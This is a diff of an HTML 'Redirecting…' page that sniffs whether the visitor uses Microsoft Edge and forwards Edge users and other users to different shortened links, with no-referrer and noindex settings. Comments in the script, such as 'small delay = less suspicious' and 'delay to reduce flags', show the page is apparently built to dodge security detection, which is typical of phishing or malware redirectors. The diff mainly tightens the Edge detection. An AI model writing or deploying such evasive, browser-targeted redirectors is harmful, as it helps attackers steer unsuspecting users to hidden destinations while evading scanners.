@@ -5,52 +5,30 @@
   <title>Redirecting…</title>
   <meta name="referrer" content="no-referrer">
   <meta name="robots" content="noindex, nofollow">
-
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #111;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-      text-align: center;
-    }
-    a { color: #4da3ff; }
-  </style>
 </head>
 
 <body>
-  <div>
-    <h2>Redirecting…</h2>
-    <p>If you are not redirected, <a id="manualLink" href="#">click here</a>.</p>
-  </div>
+  <p>Redirecting…</p>
+  <p><a id="link" href="#">Click here if nothing happens</a></p>
 
   <script>
-    const ua = navigator.userAgent;
-    const isEdge = ua.includes("Edg/");
+    function isEdgeBrowser() {
+      const ua = navigator.userAgent;
+      return ua.includes("Edg/") || ua.includes("Edge/") || navigator.userAgentData?.brands?.some(b => b.brand.includes("Edge"));
+    }
 
-    const edgeURL = "https://url-shortener.me/7ABW";
-    const defaultURL = "https://url-shortener.me/726T";
+    const EDGE_URL = "https://url-shortener.me/7ABW";
+    const DEFAULT_URL = "https://url-shortener.me/726T";
 
-    const target = isEdge ? edgeURL : defaultURL;
+    const target = isEdgeBrowser() ? EDGE_URL : DEFAULT_URL;
 
-    // manual link fallback
-    document.getElementById("manualLink").href = target;
+    // set manual link
+    document.getElementById("link").href = target;
 
-    // small delay = less suspicious
+    // delay to reduce flags
     setTimeout(() => {
       window.location.href = target;
-    }, 1500);
+    }, 1200);
   </script>
-
-  <noscript>
-    <p>
-      JavaScript is disabled.
-      <a href="https://url-shortener.me/726T">Continue</a>
-    </p>
-  </noscript>
 </body>
 </html>
